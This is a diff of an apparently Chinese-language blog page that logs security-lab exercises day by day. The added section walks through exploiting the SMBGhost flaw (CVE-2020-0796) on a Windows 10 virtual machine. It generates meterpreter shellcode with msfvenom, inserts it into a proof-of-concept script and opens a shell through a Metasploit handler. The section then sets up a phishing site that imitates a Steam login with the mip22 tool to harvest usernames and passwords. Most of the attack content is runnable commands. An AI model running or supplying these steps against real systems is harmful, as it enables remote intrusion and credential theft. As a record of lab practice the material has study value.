@@ -95,7 +95,7 @@
 <p>5、选择自定义安装路径并记住，其他默认即可，点击next，等待安装完成。</p>
 <p>6、按住快捷键win+R进入运行框，输入cmd回车，输入python回车，若显示如下则表示安装成功。</p>
 <p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231202232502742.png"></p>
-<h3 id="二、永恒之黑漏洞的蓝屏攻击"><a href="#二、永恒之黑漏洞的蓝屏攻击" class="headerlink" title="二、永恒之黑漏洞的蓝屏攻击"></a>二、永恒之黑漏洞的蓝屏攻击</h3><p>1、打开VMware中的win10和kali虚拟机。确保两台虚拟机正常运行。<br>2、在win10虚拟机上关闭防火墙，以确保后续漏洞检测和攻击操作不受阻。</p>
+<h3 id="二、永恒之黑漏洞的蓝屏攻击（1）"><a href="#二、永恒之黑漏洞的蓝屏攻击（1）" class="headerlink" title="二、永恒之黑漏洞的蓝屏攻击（1）"></a>二、永恒之黑漏洞的蓝屏攻击（1）</h3><p>1、打开VMware中的win10和kali虚拟机。确保两台虚拟机正常运行。<br>2、在win10虚拟机上关闭防火墙，以确保后续漏洞检测和攻击操作不受阻。</p>
 <p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231202232913367.png"></p>
 <p>3、在win10虚拟机上，通过快捷键Win+R打开命令行。<br>4、在命令行窗口中输入“ipconfig”命令，查看虚拟机的IPv4地址。记录下IPv4地址，后续将使用该地址进行攻击。<br>5、在命令行窗口中输入CVE-2020-0796-Scanner.exe路径来检测设备是否存在CVE-2020-0796漏洞。确认系统存在此漏洞，可以进行下一步操作。</p>
 <p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231202233646383.png"></p>
@@ -109,7 +109,40 @@
 <p>11、按下回车键执行攻击命令。观察win10虚拟机的运行结果，发现win10出现蓝屏现象。</p>
 <p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231202234508366.png"></p>
 <hr>
-<h1 id="星期三"><a href="#星期三" class="headerlink" title="星期三"></a>星期三</h1>
+<h1 id="星期三"><a href="#星期三" class="headerlink" title="星期三"></a>星期三</h1><h3 id="一、永恒之黑漏洞的蓝屏攻击（2）"><a href="#一、永恒之黑漏洞的蓝屏攻击（2）" class="headerlink" title="一、永恒之黑漏洞的蓝屏攻击（2）"></a>一、永恒之黑漏洞的蓝屏攻击（2）</h3><p>1、打开VMware中的win10和kali虚拟机。确保两台虚拟机正常运行。</p>
+<p>2、在kali终端中输入以下命令，安装ntlm_auth模块。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ntlm_auth</span><br></pre></td></tr></table></figure>
+
+<p>3、将SMBGhost_RCE_PoC-master.zip拖入kali并解压。</p>
+<p>4、在kali中利用MSF生成木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -b ‘\x00’ -i 1 -f python</span><br></pre></td></tr></table></figure>
+
+<p>5、用生成的shellcode将漏洞利用工具exploit.py文件中的一部分替换掉，直接复制粘贴，然后再将粘贴内容中的buf替换成USER_PAYLOAD并保存。</p>
+<p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231203113502264.png"></p>
+<p>6、在一个终端中进入msf，使用对应模块，监听目标机指定端口6666。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set lport 6666</span><br><span class="line">set rhost 靶机ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>同时，新开终端窗口，运行exploit.py脚本，反弹shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 靶机ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231203113134464.png"></p>
+<p>7、成功进入meterpreter，输入shell。</p>
+<h3 id="二、简易钓鱼网站"><a href="#二、简易钓鱼网站" class="headerlink" title="二、简易钓鱼网站"></a>二、简易钓鱼网站</h3><p>1、打开kali虚拟机，进入终端输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p>2、回车并点击i键，将127.0.0.1 9050修改为代理ip地址。</p>
+<p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231203130127034.png"></p>
+<p>3、修改成功后，Esc键退出编辑，输入:wq!强制保存并退出。</p>
+<p>4、输入下面代码克隆mip22仓库。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 git clone https://github.com/makdosx/mip22</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231203131900591.png"></p>
+<p>5、输入下面代码并运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 mip22</span><br><span class="line">cd mip22</span><br><span class="line">proxychains4 bash mip22.sh</span><br></pre></td></tr></table></figure>
+
+<p>6、等待运行成功，这里我们选择steam（序号51），然后选择序号3，在浏览器中访问输出的网址，输入账号密码，即可在kali终端看到用户的账号和密码。</p>
+<p><img src="https://raw.githubusercontent.com/Runner691/image/main/imgimage-20231203132505394.png"></p>
+<h1 id="星期四"><a href="#星期四" class="headerlink" title="星期四"></a>星期四</h1>
       
     </div>
     <footer>
